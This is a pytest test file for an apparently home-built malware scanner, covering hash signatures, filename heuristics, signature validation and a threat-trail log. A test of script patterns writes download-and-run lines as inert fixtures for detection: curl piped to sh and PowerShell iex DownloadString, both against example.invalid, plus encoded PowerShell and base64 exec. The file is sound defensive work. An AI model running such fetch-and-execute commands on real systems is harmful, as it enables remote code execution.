import hashlib, json
from pathlib import Path
import pytest
from app.database import Database
from app.detection_rules import RuleMatch
from app.detector import SCRIPT_PREVIEW_BYTES, Detector
from app.hashing import inspect_file
from app.models import DetectionResult, DetectionStatus, ScanSource, Signature, SignatureKind
from app.signatures import AUTOGUARD_TEST_CONTENT, AUTOGUARD_TEST_SHA256, SignatureLoadError, SignatureStore, load_signatures
from app.threat_trail import ThreatTrail

@pytest.fixture
def detector() -> Detector: return Detector(load_signatures())

def write_signatures(path: Path, entries: list[dict]) -> None:
    path.write_text(json.dumps({"schema_version": 1, "signatures": entries}), encoding="utf-8")

def test_known_bad_hash_detection(tmp_path: Path) -> None:
    content = b"Benign fixture registered as known malicious for this unit test."
    digest = hashlib.sha256(content).hexdigest()
    signature_path = tmp_path / "signatures.json"
    write_signatures(signature_path, [{"name": "Synthetic.KnownBad.Fixture", "sha256": digest.upper(), "kind": "known_malicious", "description": "Harmless unit-test bytes."}])
    path = tmp_path / "invoice.pdf.exe"; path.write_bytes(content)
    result = Detector(load_signatures(signature_path)).detect_file(path)
    assert result.status is DetectionStatus.HIGH_CONFIDENCE and result.confidence == 1.0 and result.rule_name == "known_malicious_sha256" and result.sha256 == digest
    assert result.matched_signature is not None and result.matched_signature.kind is SignatureKind.KNOWN_MALICIOUS and result.matched_signature.name == "Synthetic.KnownBad.Fixture"
    assert result.label == "Dangerous" and path.read_bytes() == content

def test_harmless_autoguard_signature(detector: Detector, tmp_path: Path) -> None:
    path = tmp_path / "autoguard-test.txt"; path.write_bytes(AUTOGUARD_TEST_CONTENT)
    result = detector.detect_file(path)
    assert result.status is DetectionStatus.HIGH_CONFIDENCE and result.sha256 == AUTOGUARD_TEST_SHA256 and result.rule_name == "autoguard_test_signature"
    assert result.matched_signature is not None and result.matched_signature.kind is SignatureKind.AUTOGUARD_TEST
    assert "harmless" in result.reason.lower() and path.read_bytes() == AUTOGUARD_TEST_CONTENT

def test_test_signature_requires_exact_content(detector: Detector, tmp_path: Path) -> None:
    path = tmp_path / "notes.txt"; path.write_bytes(b"Documentation mentioning: " + AUTOGUARD_TEST_CONTENT)
    assert detector.detect_file(path).status is DetectionStatus.NO_DETECTION

def test_detector_uses_only_injected_signatures(tmp_path: Path) -> None:
    path = tmp_path / "test.txt"; path.write_bytes(AUTOGUARD_TEST_CONTENT)
    assert Detector(SignatureStore()).detect_file(path).status is DetectionStatus.NO_DETECTION

@pytest.mark.parametrize("name,content", [("notes.txt", b"Ordinary unknown text."), ("empty.txt", b""), ("clean.py", b"print('Hello')\n"), ("clean.ps1", b"Write-Output 'Hello'\n"), ("archive.tar.gz", b"Synthetic archive fixture."), ("sample.bin", b"\x00\x01\x02\xff")])
def test_normal_unknown_and_clean_files(detector: Detector, tmp_path: Path, name: str, content: bytes) -> None:
    path = tmp_path / name; path.write_bytes(content); result = detector.detect_file(path)
    assert result.status is DetectionStatus.NO_DETECTION and result.confidence == 0.0 and result.sha256 == hashlib.sha256(content).hexdigest()
    assert result.rule_name == "no_rule_matched" and result.matched_signature is None and result.label == "No Threat Detected"

@pytest.mark.parametrize("name", ["invoice.pdf.exe", "INVOICE.PDF.EXE", "photo.jpg.scr", "report.docx.ps1"])
def test_double_extensions(detector: Detector, tmp_path: Path, name: str) -> None:
    path = tmp_path / name; path.write_bytes(b"Harmless filename-rule fixture."); result = detector.detect_file(path)
    assert result.status is DetectionStatus.LOW_CONFIDENCE and result.rule_name == "double_extension" and 0.0 < result.confidence < 1.0
    assert result.matched_signature is None and result.label == "Suspicious" and path.exists()

def test_executable_extension_alone_is_low_confidence(detector: Detector, tmp_path: Path) -> None:
    path = tmp_path / "installer.exe"; path.write_bytes(b""); result = detector.detect_file(path)
    assert result.status is DetectionStatus.LOW_CONFIDENCE and result.rule_name == "executable_extension" and "legitimate" in result.reason and path.exists()

@pytest.mark.parametrize("name,expected", [("keygen.txt", DetectionStatus.LOW_CONFIDENCE), ("crackling-notes.txt", DetectionStatus.NO_DETECTION)])
def test_suspicious_filename_keywords(detector: Detector, tmp_path: Path, name: str, expected: DetectionStatus) -> None:
    path = tmp_path / name; path.write_bytes(b"Harmless name test."); result = detector.detect_file(path)
    assert result.status is expected
    if expected is DetectionStatus.LOW_CONFIDENCE: assert result.rule_name == "suspicious_filename"

@pytest.mark.parametrize("name,text,rule_name", [("sample.cmd", "powershell -EncodedCommand WA==", "script_encoded_powershell"), ("sample.sh", "curl https://example.invalid/test | sh", "script_download_pipe"), ("sample.py", "exec(base64.b64decode('cGFzcw=='))", "script_decoded_execution"), ("sample.ps1", "iex (New-Object Net.WebClient).DownloadString('https://example.invalid/test')", "script_powershell_download_execution")])
def test_suspicious_script_patterns(detector: Detector, tmp_path: Path, name: str, text: str, rule_name: str) -> None:
    path = tmp_path / name; path.write_text(text, encoding="utf-8"); result = detector.detect_file(path)
    assert result.status is DetectionStatus.LOW_CONFIDENCE and result.rule_name == rule_name and result.confidence == 0.65 and result.matched_signature is None
    assert path.read_text(encoding="utf-8") == text

def test_utf16_script_patterns(detector: Detector, tmp_path: Path) -> None:
    path = tmp_path / "example.ps1"; path.write_bytes("powershell -EncodedCommand WA==".encode("utf-16"))
    result = detector.detect_file(path)
    assert result.status is DetectionStatus.LOW_CONFIDENCE and result.rule_name == "script_encoded_powershell"

def test_multiple_heuristics_never_escalate_or_move_files(detector: Detector, tmp_path: Path) -> None:
    path = tmp_path / "keygen.pdf.exe"; content = b"Harmless content matching three filename/extension rules."; path.write_bytes(content)
    result = detector.detect_file(path)
    assert result.status is DetectionStatus.LOW_CONFIDENCE and result.confidence == 0.60 and result.matched_signature is None
    assert path.read_bytes() == content and list(tmp_path.iterdir()) == [path]

def test_full_hash_with_bounded_script_preview(detector: Detector, tmp_path: Path) -> None:
    path = tmp_path / "long.py"; content = b"# Padding\n" * SCRIPT_PREVIEW_BYTES + b"exec(base64.b64decode('cGFzcw=='))"; path.write_bytes(content)
    inspection = inspect_file(path, chunk_size=4096, preview_bytes=17)
    assert inspection.preview == content[:17] and inspection.fingerprint.sha256 == hashlib.sha256(content).hexdigest() and inspection.fingerprint.size_bytes == len(content)
    result = detector.detect_file(path)
    assert result.status is DetectionStatus.NO_DETECTION and "first 65536 bytes" in result.reason
    signatures = SignatureStore([Signature("Synthetic.LongFile.Fixture", inspection.fingerprint.sha256, SignatureKind.KNOWN_MALICIOUS, "Harmless bytes registered for this test.")])
    assert Detector(signatures).detect_file(path).status is DetectionStatus.HIGH_CONFIDENCE

@pytest.mark.parametrize("changes", [{"sha256": "invalid"}, {"kind": "unrecognized_kind"}, {"kind": "autoguard_test", "sha256": "0" * 64}])
def test_invalid_signatures_are_rejected(tmp_path: Path, changes: dict) -> None:
    entry = {"name": "Synthetic.Fixture", "sha256": "a" * 64, "kind": "known_malicious", "description": "Test metadata."}; entry.update(changes)
    path = tmp_path / "invalid-signatures.json"; write_signatures(path, [entry])
    with pytest.raises(SignatureLoadError): load_signatures(path)

def test_duplicate_signature_hashes_are_rejected(tmp_path: Path) -> None:
    path = tmp_path / "duplicates.json"; entry = {"name": "Synthetic.Fixture", "sha256": "a" * 64, "kind": "known_malicious"}
    write_signatures(path, [entry, dict(entry, sha256="A" * 64)])
    with pytest.raises(SignatureLoadError, match="Duplicate"): load_signatures(path)

def test_signature_load_failures_are_explicit(tmp_path: Path) -> None:
    path = tmp_path / "broken.json"
    with pytest.raises(SignatureLoadError): load_signatures(path)
    path.write_text("not valid JSON", encoding="utf-8")
    with pytest.raises(SignatureLoadError): load_signatures(path)
    path.write_text('{"schema_version": 2, "signatures": []}', encoding="utf-8")
    with pytest.raises(SignatureLoadError): load_signatures(path)

def test_default_signature_path_is_independent_of_working_directory(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.chdir(tmp_path); assert load_signatures().lookup(AUTOGUARD_TEST_SHA256) is not None

def test_read_errors_are_not_no_detection(detector: Detector, tmp_path: Path) -> None:
    with pytest.raises(FileNotFoundError): detector.detect_file(tmp_path / "missing.txt")
    with pytest.raises(ValueError, match="regular files"): detector.detect_file(tmp_path)

def test_detector_preserves_threat_trail(detector: Detector, tmp_path: Path) -> None:
    database = Database(tmp_path / "database" / "autoguard.db"); database.initialize()
    trail = ThreatTrail(database); paths = [tmp_path / "first.txt", tmp_path / "second.txt"]; observations = []
    for path, source in zip(paths, (ScanSource.MANUAL, ScanSource.USB)):
        path.write_bytes(AUTOGUARD_TEST_CONTENT); observations.append(trail.record_file(path, source))
        result = detector.detect_file(path)
        assert result.sha256 == observations[-1].sha256 and result.status is DetectionStatus.HIGH_CONFIDENCE
    assert trail.get_observations(AUTOGUARD_TEST_SHA256) == observations and len(trail.get_events(AUTOGUARD_TEST_SHA256)) == 2
    assert all(item.seen_count == 1 for item in observations) and "do not establish an infection source" in trail.describe_locations(AUTOGUARD_TEST_SHA256)

def test_high_confidence_requires_signature_evidence() -> None:
    with pytest.raises(ValueError, match="matching signature"):
        DetectionResult(DetectionStatus.HIGH_CONFIDENCE, 1.0, "Heuristic only.", "example_rule", "a" * 64, "example.txt")
    with pytest.raises(ValueError, match="Heuristic scores"): RuleMatch("invalid_heuristic", "No hash evidence.", 1.0)